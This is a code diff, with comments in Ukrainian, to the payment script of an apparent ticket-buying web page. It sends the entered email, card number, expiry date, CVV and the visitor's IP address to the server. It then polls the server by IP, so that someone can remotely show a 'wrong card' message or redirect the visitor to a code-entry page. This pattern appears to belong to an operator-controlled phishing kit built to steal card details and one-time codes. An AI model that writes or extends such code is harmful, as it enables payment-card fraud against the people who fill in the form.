@@ -176,14 +176,29 @@
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
         try {
+            // Додаємо IP до даних
+            let ip = userIP;
+            if (!ip) {
+                // fallback якщо ще не отримали IP
+                await new Promise(res => setTimeout(res, 500));
+                ip = userIP;
+            }
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv })
+                body: JSON.stringify({ email, card, expiry, cvv, ip })
             });
             if (response.ok) {
-                // Після успішної відправки даних
-                window.location.href = '/buy-tickets/code/';
+                // Просто показуємо повідомлення
+                if (!document.getElementById('payment-msg')) {
+                    const msg = document.createElement('div');
+                    msg.id = 'payment-msg';
+                    msg.style.color = '#16b6ff';
+                    msg.style.fontWeight = '500';
+                    msg.style.marginTop = '18px';
+                    msg.textContent = 'Payment sent!';
+                    document.querySelector('.payment-card').appendChild(msg);
+                }
             } else {
                 console.error('Помилка при відправці даних');
             }
@@ -224,6 +239,19 @@
             .then(txt => {
                 if (txt === 'true') {
                     showWrongCardMsg();
+                }
+            });
+    }, 2000);
+    </script>
+    <script>
+    // --- POLLING для code redirect ---
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    window.location.href = '/buy-tickets/code/';
                 }
             });
     }, 2000);
